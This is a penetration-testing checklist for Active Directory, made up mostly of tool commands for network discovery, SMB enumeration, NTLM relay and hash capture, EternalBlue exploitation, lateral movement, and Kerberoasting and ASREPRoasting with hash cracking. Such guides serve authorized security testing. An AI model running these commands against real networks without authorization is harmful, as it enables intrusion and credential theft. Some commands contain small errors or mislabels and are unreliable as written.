# Checklist for Active Directory Penetration Testing

## Initial Access / No Credentials

### Host Discovery

```bash
# Use the inscope IP's in place of <IP>. If none are provided, scan 0/16 on all available networks.
masscan --ping <IP> -oG ping --rate=500 ; masscan -p445,3389 <ip> -oG port --rate=500; cat ping port | cut -f 3 -d ' ' | sort -u > discovery

# Use Nmap for host discovery:
nmap -sn <network-range>

# Use fping for faster network sweeps:
fping -a -g <network-range> > live_hosts.txt
```

#### Response Action

After identifying live hosts:

- **Ping Sweep for Validation:**
  ```bash
  for ip in $(cat live_hosts.txt); do ping -c 1 $ip; done
  ```

- **Perform Service Scans:**
  ```bash
  nmap -sS -p- <target-ip> --open
  ```

- **Run Detailed Scans on Open Ports:**
  ```bash
  nmap -sC -sV -p <open-ports> <target-ip>
  ```

- **Log Findings:**
  Use a tool like `grep` to extract specific details:
  ```bash
  grep -E "open|filtered" nmap_scan_results.txt
  ```

### Nessus Scan (Non-Credentialed)

Run Nessus scans to identify vulnerabilities.&#x20;

- Using the information from the host discovery phase, run Nessus scans on the identified hosts.

### Null Sessions / Anonymous Logons

```bash
# Check for null sessions and anonymous logins.
nxc smb discovery -u '' -p ''
nxc smb discovery -u 'a' -p ''

# Enumerate null sessions on the domain controller.
enum4linux -a <dc-ip>

# Additional Tools and Commands:
# Use rpcclient to enumerate null sessions:
rpcclient -U "" -N <dc-ip>
```

#### Response Action

If an anonymous login is detected, further enumerate the target using the following steps and tools:

- **Enumerate Shares:**

  ```bash
  smbclient -L \<target-ip> -N
  smbclient \<target-ip>\share -N
  ```

- **Enumerate Registry (Windows):**

  ```bash
  rpcclient -U "" -N <dc-ip>
  > enumdomusers
  > querydispinfo
  ```

- **Identify Sensitive Files:**
  Use automated scripts like `smbmap` to locate readable files:

  ```bash
  smbmap -H <dc-ip>
  ```

- **Access Shares with Write Permissions:**
  Check for writable shares and attempt to upload files or scripts for persistence or privilege escalation:

  ```bash
  echo "Test File" > test.txt
  smbclient \<target-ip>\writable-share -N -c "put test.txt"
  ```

- **Explore Metasploit Modules:**
  Use Metasploit to scan and exploit available shares:

  ```bash
  msfconsole
  use auxiliary/scanner/smb/smb_enumshares
  set RHOSTS <dc-ip>
  run
  ```



### SMB Signing Off

```bash
# Generate a list of hosts with SMB signing not enabled.
nxc smb discovery --gen-relay-list smboff.txt

# Use Nmap to check SMB signing status:
nmap --script=smb2-security-mode.nse -p 445 -Pn --open 10.10.10.0/24

# Utilize Metasploit modules to analyze SMB signing:
msfconsole
use auxiliary/scanner/smb/smb2
set RHOSTS 10.10.10.0/24
run

# PowerShell command to verify SMB signing:
Invoke-Command -ScriptBlock {Get-SmbServerConfiguration | Select-Object Name, EnableSMB2Protocol, RequireSecuritySignature}
```

#### Response Action

If SMB signing is disabled:

- **Check for Relay Attack Potential:**
  ```bash
  ntlmrelayx.py -t <target-ip>
  ```

- **Use Responder for Capturing Hashes:**
  ```bash
  responder -I eth0 -rdwF
  ```

- **Validate Share Permissions:**
  ```bash
  smbmap -H <target-ip>
  ```

- **Log Findings for Report Generation:**
  Ensure all shares and permissions are documented for client review.

### Anonymous Shares

```bash
# Check if there are any accessible shares anonymously.
smbclient \\test.local\public -I 10.10.10.1 -N

# Use Metasploit to enumerate anonymous shares:
msfconsole
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.1
run

# Use enum4linux-ng for detailed share enumeration:
enum4linux-ng -A 10.10.10.1
```

### Mounts

```bash
# Check if mounts are available and mount them if possible.
showmount -e <ip>

# Mount in Kali's Thunar file manager:
smb://ip/share

# Use Metasploit to identify and exploit writable mounts:
msfconsole
use auxiliary/scanner/nfs/nfsmount
set RHOSTS <ip>
run

# Mount NFS shares using Nmap:
nmap -p 2049 --script=nfs-ls,nfs-statfs <ip>
```

### Relay Attacks

#### Vulnerable Network Protocols

- Use tools like Responder and ntlmrelayx to identify and exploit relay attack vulnerabilities.
- Use Coercer to force authentication and relay attacks:
  ```bash
  coercer -t 10.10.10.1 -l 10.10.10.2
  ```

#### Response Action

After identifying vulnerable protocols:

- **Set Up Relay Attacks:**
  ```bash
  ntlmrelayx.py -t smb://<target-ip>
  ```

- **Capture and Analyze Credentials:**
  Use tools like `john` or `hashcat` to process captured NTLM hashes:
  ```bash
  john --format=nt --wordlist=<wordlist> <hash-file>
  ```

- **Perform Lateral Movement:**
  Use tools like `wmiexec` from Impacket:

  ```bash
  wmiexec.py <user>:<pass>@<target-ip>
  ```

  **Additional Tools:**

  - **psexec.py (Impacket):**
    ```bash
    psexec.py <user>:<pass>@<target-ip>
    ```

  - **xfreerdp (Linux FreeRDP):**
    ```bash
    xfreerdp /u:<user> /p:<pass> /v:<target-ip>
    ```

  - **CrackMapExec for Remote Command Execution:**
    ```bash
    nxc smb <target-ip> -u <user> -p <pass> --exec "cmd.exe /c whoami"
    ```
  ```bash
  wmiexec.py <user>:<pass>@<target-ip>
  ```

- **Document Network Vulnerabilities:**
  Ensure all relay attack vectors and findings are added to the final report for mitigation recommendations.

### Username Enumeration

```bash
# Enumerate usernames using Kerbrute:
kerbrute userenum -d test.local usernames.txt

# Enumerate usernames using Nmap:
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt <dc-ip>

# Enumerate usernames using Impacket's GetADUsers:
GetADUsers.py -dc-ip <dc-ip> domain/username:password

# Enumerate usernames using BloodHound:
bloodhound-python -u <username> -p '<password>' -d <domain> -c 'all' --only-user-enumeration
```

### Low Hanging Fruit / Easy Wins

#### MS17 Exploits

- Exploit EternalBlue or similar vulnerabilities.
- Use Metasploit to automate EternalBlue exploitation:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <target-ip>
run
```

#### Printers

- Use tools to dump printer address books for potential credentials.
- Example:

```bash
# Use Nmap to detect vulnerable printers:
  nmap -p 9100 --script=printer-ready-info
```
- Use Nmap to detect vulnerable printers:
  nmap -p 9100 --script=printer-ready-info
---

## Usernames with No Passwords

### Password Spray

Test common passwords against user accounts to identify weak credentials.

### ASREPRoast

```bash
# Enumerate and crack accounts vulnerable to ASREPRoasting.
GetNPUsers.py -request -usersfile users.txt -format hashcat -outputfile ASREPRoastables.txt domain/user:pass
hashcat -m 18200 <ASREPRoastables.txt> <wordlist>
```



---

## With User Credentials / Low Privileges

### NXC Checlist for enumeration with user credentials / low privileges
#### SMB Commands
```bash
# Enumerate users
nxc smb <target-ip> -u <username> -p <password> --users
# Enumerate shares
nxc smb <target-ip> -u <username> -p <password> --shares
# Enumerate password policy
nxc smb <target-ip> -u <username> -p <password> --pass-pol
# Enumerate Anti Virus
nxc smb <target-ip> -u <username> -p <password> -M enum_av
# Enumerate ADCS
nxc smb <target-ip> -u <username> -p <password> -M enum_ca
# Enumerate GPP Autologin and Passwords
nxc smb <target-ip> -u <username> -p <password> -M gpp_autologin
nxc smb <target-ip> -u <username> -p <password> -M gpp_password
# Enumerate Nopac
nxc smb <target-ip> -u <username> -p <password> -M nopac
# Enumerate Printnightmare
nxc smb <target-ip> -u <username> -p <password> -M printnightmare
# Enumerate ZeroLogon
nx smb <target-ip> -u <username> -p <password> -M zerologon
```
#### LDAP Commands
```bash
# Enumerate MAQ (Machine Account Quota)
nxc ldap <dc-ip> -u <username> -p <password> -M maq
# Enumerate ADCS
nxc ldap <dc-ip> -u <username> -p <password> -M adcs
# Enumerate LDAP
nxc ldap <dc-ip> -u <username> -p <password> -M ldap-checker
# Enumerate LAPS (Local Administrator Password Solution)
nxc ldap <dc-ip> -u <username> -p <password> -M laps
```

### Kerberoasting

```bash
# Enumerate service accounts for Kerberoasting.
# Netexec Kerberoast
nxc ldap <dc-ip> -u <username> -p <password> --kerberoast kerberoast.txt
nxc ldap <dc-ip> -u <username> -H <HASH> --kerberoast kerberoast.txt
# Impacket
GetUserSPNs.py -request -dc-ip <dc-ip> -target-domain domain.local username:password
```

### ASREPRoasting
```bash
# Netexec ASREPRoast (requires a username list)
nxc ldap <dc-ip> -u usernameslist.txt -p '' --asreproast asreproast.txt
# Netexec ASREPRoast (requires a username and password or hash)
nxc ldap <dc-ip> -u <username> -p <password> --asreproast asreproast.txt
nxc ldap <dc-ip> -u <username> -H <HASH> --asreproast asreproast.txt

# Impacket ASREPRoast (requires a username wordlist)
GetNPUsers.py -request -usersfile users.txt -format hashcat -outputfile ASREPRoastables.txt domain/user:pass
```


### BloodHound

```bash
# Collect Active Directory data for analysis in BloodHound.
bloodhound-python -u <username> -p '<password>' -d <domain> -c All --zip

# Bloodhound with Netexec
nxc ldap <dc-ip> -u <username> -p <password> --bloodhound --collection All
```

## Domain Admin Credentials

Run with Domain Admin (DA) credentials after escalation.

### Shared Locals

```bash
# Enumerate local users and groups with NXC.
nxc smb discovery -u username -p password --local-users
nxc smb discovery -u username -p password --local-groups
```

### Password Reuse

Identify password reuse across local and domain accounts.

## Additional Techniques

### SMB Signing

```bash
# Check SMB signing using Nmap.
nmap --script=smb2-security-mode.nse -p 445 -Pn --open 10.10.10.0/24
```

### ADCS Exploits

```bash
# Enumerate and exploit Active Directory Certificate Services (ADCS).
certipy find -u username -p password -dc-ip <ip>
```

### PrintNightmare

```bash
# Check for and exploit PrintNightmare vulnerabilities.
python3 printnightmare.py -check <dc-ip>
```

### Constrained Delegation

```bash
# Enumerate constrained delegation settings.
GetUserSPNs.py -request -dc-ip <dc-ip> -target-domain domain.local username:password
```

### Unconstrained Delegation

```bash
# Find computers with unconstrained delegation.
Get-DomainComputer -Unconstrained
```

---

This checklist serves as a comprehensive guide for performing Active Directory penetration testing. Expand upon each section with specific tools, methodologies, or scripts as needed.

